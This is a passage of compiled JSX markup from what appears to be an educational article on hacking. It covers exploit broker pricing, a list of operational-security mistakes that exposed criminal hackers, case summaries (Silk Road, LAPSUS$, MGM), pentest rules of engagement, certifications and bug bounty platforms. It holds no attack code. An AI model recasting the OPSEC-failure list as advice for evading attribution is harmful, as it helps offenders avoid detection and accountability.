                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "300,000"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Signal/WhatsApp"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "500"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "500,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "500"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "1,500,000"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "VPN appliances"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "50"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "200,000"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IoT/Embedded"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "5"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        separator: "true",
                        children: ","
                      }), (0,jsx_runtime.jsx)(_components.mn, {
                        children: "000"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "5,000 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.8389em",
                      verticalAlign: "-0.1944em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "5"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mpunct",
                    children: ","
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mspace",
                    style: {
                      marginRight: "0.1667em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "000"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "50,000"]
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Exploit Brokers (Zerodium, Crowdfense):"
      }), "\nZerodium is the largest exploit broker, paying researchers for exploits and selling to government clients. Their pricing is public: ", (0,jsx_runtime.jsxs)(_components.span, {
        className: "katex",
        children: [(0,jsx_runtime.jsx)(_components.span, {
          className: "katex-mathml",
          children: (0,jsx_runtime.jsx)(_components.math, {
            xmlns: "http://www.w3.org/1998/Math/MathML",
            children: (0,jsx_runtime.jsxs)(_components.semantics, {
              children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                children: [(0,jsx_runtime.jsx)(_components.mn, {
                  children: "2.5"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "M"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "r"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "f"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "u"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "l"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "P"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "o"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "e"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "c"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "h"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "a"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "i"
                }), (0,jsx_runtime.jsx)(_components.mi, {
                  children: "n"
                }), (0,jsx_runtime.jsx)(_components.mo, {
                  separator: "true",
                  children: ","
                })]
              }), (0,jsx_runtime.jsx)(_components.annotation, {
                encoding: "application/x-tex",
                children: "2.5M for full iPhone chain, "
              })]
            })
          })
        }), (0,jsx_runtime.jsx)(_components.span, {
          className: "katex-html",
          "aria-hidden": "true",
          children: (0,jsx_runtime.jsxs)(_components.span, {
            className: "base",
            children: [(0,jsx_runtime.jsx)(_components.span, {
              className: "strut",
              style: {
                height: "0.8889em",
                verticalAlign: "-0.1944em"
              }
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord",
              children: "2.5"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.109em"
              },
              children: "M"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0278em"
              },
              children: "or"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1076em"
              },
              children: "f"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "u"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.0197em"
              },
              children: "l"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "i"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              style: {
                marginRight: "0.1389em"
              },
              children: "P"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "h"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "o"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "n"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "ec"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mord mathnormal",
              children: "hain"
            }), (0,jsx_runtime.jsx)(_components.span, {
              className: "mpunct",
              children: ","
            })]
          })
        })]
      }), "2M for WhatsApp RCE, $500K for Chrome. They primarily serve \"Western intelligence agencies.\""]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "The business model:"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Researcher → Zerodium → Government Client\n             (Broker)      (End User)\n                ↑             ↓\n           Buys exploits  Uses for ops/defense\n           $500K-$2.5M    Classified missions\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Zerodium's model has been criticized for enabling offensive cyber operations by governments, but they argue they vet buyers and only sell to \"democratic nations with strong human rights records.\""
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "17-opsec-failures",
      children: "1.7 OPSEC Failures"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Many high-profile Black Hat hackers were caught due to operational security (OPSEC) failures. These provide critical lessons:"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Common OPSEC Failures:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Reusing Handles/Nicknames:"
        }), " Sabu (LulzSec) reused \"Sabu\" across forums spanning years"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Personal Infrastructure:"
        }), " Using home IP addresses for C2 servers"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Payment Trail:"
        }), " Converting Bitcoin to fiat on exchanges with KYC (BTC-e)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Bragging:"
        }), " Posting on social media or forums about successes"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Crypto Mistakes:"
        }), " Bitcoin blockchain is permanent. Chainalysis tracks every transaction."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Personality Leaks:"
        }), " Writing style analysis, timezone from activity patterns"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Technical Fingerprints:"
        }), " Leaving personal credentials in malware compile paths or PDB strings"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Covernacular Breaks:"
        }), " Using real name or personal email during op"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Famous OPSEC Failure: Ross Ulbricht (Silk Road)\n┌────────────────────────────────────────────┐\n│ Use: Silk Road (darknet market)             │\n│ OPSEC Mistake: Posted on BitcoinTalk forum  │\n│ with personal email (rossulbricht@gmail.com)│\n│ While using \"Dread Pirate Roberts\" alias    │\n│ Also: Linked Gmail account used to register │\n│ the Silk Road server with a VPN provider    │\n│     → FBI traced email → linked to real ID │\n│     → Arrested in San Francisco library    │\n└────────────────────────────────────────────┘\n\nFamous OPSEC Failure: LAPSUS$\n┌────────────────────────────────────────────┐\n│ Use: Teen hackers breached Nvidia, Okta,    │\n│ Samsung, Microsoft, Ubisoft, Rockstar       │\n│ OPSEC Mistake: Bragged in Telegram chats   │\n│ Chat members revealed real names/IPs       │\n│ Law enforcement (UK, Brazil) traced them   │\n│ through compromised Twitter accounts and    │\n│ VoIP provider records (used for SIM swap)  │\n│     → Multiple arrests in 2022            │\n│     → 18-year-old primary suspect charged │\n└────────────────────────────────────────────┘\n"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "The MGM Resorts Ransomware Attack (2023 - Scattered Spider):"
      }), "\nThe group used vishing (voice phishing) to call the MGM IT help desk, impersonating an employee, and convinced them to reset MFA — gaining access as a domain admin. They were tracked because they bragged in Discord servers and reused personal accounts for operational activities."]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "section-2-white-hat-hacking",
      children: "Section 2: White Hat Hacking"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "21-definition-and-purpose",
      children: "2.1 Definition and Purpose"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "White Hat hackers (ethical hackers) use the same techniques as Black Hats but operate with explicit authorization, clear scope, and a legal framework. Their goal is to identify and fix vulnerabilities before malicious actors can exploit them."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Core Principles:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Authorization:"
        }), " Written permission before any testing"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Scope:"
        }), " Clearly defined targets and techniques"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Confidentiality:"
        }), " Client data is protected"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Integrity:"
        }), " Testing does not damage systems"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Disclosure:"
        }), " Findings shared responsibly"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Remediation:"
        }), " Focus on fixing, not just breaking"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "22-legal-framework",
      children: "2.2 Legal Framework"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A professional pentest operates within a comprehensive legal framework:"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Rules of Engagement (ROE) Document:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "┌──────────────────────────────────────────────────┐\n│           RULES OF ENGAGEMENT                     │\n├──────────────────────────────────────────────────┤\n│ Client: Acme Corporation                          │\n│ Tester: SecurePentest LLC                         │\n│ Date Range: 2024-11-01 to 2024-11-15              │\n├──────────────────────────────────────────────────┤\n│ IN SCOPE:                                         │\n│   - 10.0.0.0/8 internal network                  │\n│   - *.acme.com external range                    │\n│   - Web applications (staging instances)          │\n├──────────────────────────────────────────────────┤\n│ OUT OF SCOPE:                                     │\n│   - Production database servers                    │\n│   - Customer PII/PCI environments                  │\n│   - Third-party hosted services                    │\n│   - SCADA/ICS/OT networks                          │\n│   - Denial of Service testing                     │\n├──────────────────────────────────────────────────┤\n│ AUTHORIZED TECHNIQUES:                             │\n│   - Network scanning (nmap, masscan)               │\n│   - Web application testing (Burp Suite, SQLmap)   │\n│   - Social engineering (phishing simulation)       │\n│   - Password attacks (no account lockout)          │\n├──────────────────────────────────────────────────┤\n│ TESTING WINDOWS:                                   │\n│   - 08:00 - 20:00 Monday - Friday                  │\n│   - No testing on holidays or change windows       │\n├──────────────────────────────────────────────────┤\n│ EMERGENCY CONTACTS:                                │\n│   - Security Operations Center: +1-555-0100        │\n│   - CISO: +1-555-0101                              │\n│   - Testers: +1-555-0199                           │\n└──────────────────────────────────────────────────┘\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Additional Legal Requirements:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Authorization Letter:"
        }), " Signed by CISO or equivalent, naming testers and scope"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Liability Waiver:"
        }), " Client agrees not to sue for unintended damage"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Insurance:"
        }), " Professional liability insurance (", (0,jsx_runtime.jsxs)(_components.span, {
          className: "katex",
          children: [(0,jsx_runtime.jsx)(_components.span, {
            className: "katex-mathml",
            children: (0,jsx_runtime.jsx)(_components.math, {
              xmlns: "http://www.w3.org/1998/Math/MathML",
              children: (0,jsx_runtime.jsxs)(_components.semantics, {
                children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                  children: [(0,jsx_runtime.jsx)(_components.mn, {
                    children: "1"
                  }), (0,jsx_runtime.jsx)(_components.mi, {
                    children: "M"
                  }), (0,jsx_runtime.jsx)(_components.mo, {
                    children: "−"
                  })]
                }), (0,jsx_runtime.jsx)(_components.annotation, {
                  encoding: "application/x-tex",
                  children: "1M-"
                })]
              })
            })
          }), (0,jsx_runtime.jsx)(_components.span, {
            className: "katex-html",
            "aria-hidden": "true",
            children: (0,jsx_runtime.jsxs)(_components.span, {
              className: "base",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "strut",
                style: {
                  height: "0.7667em",
                  verticalAlign: "-0.0833em"
                }
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord",
                children: "1"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord mathnormal",
                style: {
                  marginRight: "0.109em"
                },
                children: "M"
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "mord",
                children: "−"
              })]
            })
          })]
        }), "5M coverage)"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "NDA:"
        }), " Non-Disclosure Agreement for all data encountered"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Data Handling:"
        }), " How PII, credentials, and sensitive data will be handled/retained/destroyed"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "23-certifications",
      children: "2.3 Certifications"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Certification"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Focus"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Experience Required"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Exam Cost"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Renewal"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CEH (EC-Council)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Broad ethical hacking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2 years or training"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$1,199"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$80/yr + 120 CPE"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "OSCP (OffSec)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hands-on pentesting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None (practical)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$1,599 per attempt"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lifetime"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "GPEN (SANS/GIAC)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pentesting methodology"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2 years"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$2,499"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$429/yr + CPE"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "GXPN (SANS/GIAC)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Advanced exploitation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GPEN recommended"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$2,499"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$429/yr + CPE"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CISSP (ISC2)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Security management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5 years"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$749"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$85/yr + CPE"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "PNPT (TCM Security)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Practical network pentest"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "None"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$599 per attempt"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lifetime"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CRTP (PentesterAcademy)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AD pentesting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OSCP recommended"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "$399"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lifetime"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Certification Path Recommendation:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "Entry Level: CEH or Security+ → Hands-on: OSCP or PNPT →\nAdvanced: GPEN/GXPN → Strategic: CISSP\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "24-bug-bounty-platforms",
      children: "2.4 Bug Bounty Platforms"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Platform Comparison:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Platform"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Starting"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Payout Range"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Structure"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Notable Programs"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "HackerOne"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2012"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "100"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "100 - "
                    })]
                  })
                })
              }), (0,jsx_runtime.jsx)(_components.span, {
                className: "katex-html",
                "aria-hidden": "true",
                children: (0,jsx_runtime.jsxs)(_components.span, {
                  className: "base",
                  children: [(0,jsx_runtime.jsx)(_components.span, {
                    className: "strut",
                    style: {
                      height: "0.7278em",
                      verticalAlign: "-0.0833em"
                    }
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "100"
                  }), (0,jsx_runtime.jsx)(_components.span, {
                    className: "mord",
                    children: "−"
                  })]
                })
              })]
            }), "250K+"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Public/Private"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Google, PayPal, Nintendo, Twitter/X"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Bugcrowd"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2011"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsxs)(_components.span, {
              className: "katex",
              children: [(0,jsx_runtime.jsx)(_components.span, {
                className: "katex-mathml",
                children: (0,jsx_runtime.jsx)(_components.math, {
                  xmlns: "http://www.w3.org/1998/Math/MathML",
                  children: (0,jsx_runtime.jsxs)(_components.semantics, {
                    children: [(0,jsx_runtime.jsxs)(_components.mrow, {
                      children: [(0,jsx_runtime.jsx)(_components.mn, {
                        children: "50"
                      }), (0,jsx_runtime.jsx)(_components.mo, {
                        children: "−"
                      })]
                    }), (0,jsx_runtime.jsx)(_components.annotation, {
                      encoding: "application/x-tex",
                      children: "50 - "
                    })]
                  })
                })
